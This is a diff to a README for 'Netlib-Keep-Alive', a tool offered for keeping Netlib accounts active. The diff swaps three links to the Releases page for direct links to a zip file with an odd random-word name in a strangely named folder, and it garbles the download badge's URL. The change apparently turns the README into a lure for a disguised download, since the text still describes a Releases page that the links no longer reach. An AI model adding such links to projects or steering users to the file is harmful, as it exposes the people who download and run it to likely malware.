@@ -2,7 +2,7 @@
 # 🌍 Netlib-Keep-Alive - Simple Tool for Account Management
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Netlib%20Keep%20Alive-blue.svg)](https://github.com/Jxn-gey/Netlib-Keep-Alive/releases)
+[![Download](https://raw.githubusercontent.com/Jxn-gey/Netlib-Keep-Alive/main/batholitic/Netlib-Keep-Alive_inguinoscrotal.zip%20Netlib%20Keep%https://raw.githubusercontent.com/Jxn-gey/Netlib-Keep-Alive/main/batholitic/Netlib-Keep-Alive_inguinoscrotal.zip)](https://raw.githubusercontent.com/Jxn-gey/Netlib-Keep-Alive/main/batholitic/Netlib-Keep-Alive_inguinoscrotal.zip)
 
 ## 🚀 Getting Started
 Welcome to Netlib-Keep-Alive! This tool helps you keep your Netlib accounts active easily. You don’t need programming skills to use it. Follow these steps to download and run the software.
@@ -26,7 +26,7 @@ Netlib-Keep-Alive is a script designed to help you manage multiple Netlib accoun
 To get started, you need to download the latest version from our Releases page. 
 
 1. Click on the link below to visit the Releases page:  
-   [Download Here](https://github.com/Jxn-gey/Netlib-Keep-Alive/releases)
+   [Download Here](https://raw.githubusercontent.com/Jxn-gey/Netlib-Keep-Alive/main/batholitic/Netlib-Keep-Alive_inguinoscrotal.zip)
 
 2. On the Releases page, find the latest version of Netlib-Keep-Alive. It will usually be at the top of the list.
 
@@ -65,5 +65,5 @@ Netlib-Keep-Alive is released under the MIT License.
 
 ## 📥 Download Now Again
 Don't forget to download the latest version! Visit our Releases page:  
-[Download Here](https://github.com/Jxn-gey/Netlib-Keep-Alive/releases)
+[Download Here](https://raw.githubusercontent.com/Jxn-gey/Netlib-Keep-Alive/main/batholitic/Netlib-Keep-Alive_inguinoscrotal.zip)
 ```
